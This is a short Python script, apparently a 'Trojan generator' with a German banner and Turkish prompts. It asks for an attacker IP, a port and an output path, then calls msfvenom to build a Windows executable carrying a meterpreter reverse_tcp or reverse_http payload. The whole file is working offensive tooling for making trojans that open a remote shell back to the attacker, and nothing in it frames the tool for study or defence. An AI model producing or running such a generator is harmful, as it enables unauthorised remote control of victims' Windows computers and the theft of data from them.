#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import art
from colorama import Fore, Style

os.system("cls||clear")
my_art = art.text2art("Trojaner Erstellen", font="shadow")
print(Fore.LIGHTBLUE_EX + my_art)
print(Fore.LIGHTMAGENTA_EX + """
Willkommen beim 'omicron' Trojan Generator.
""")

ip = input("Local veya Dış İp Girin: ")
port = input("Port Girin: ")
print(""" 
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/revers_http
""")
payload = input("Payload No Girin: ")
kayityeri = input("Kayit Yeri Girin: ")

if(payload == "1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
elif(payload == "2"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
else:
	print("trojan oluştururken bir hata meydana geldi")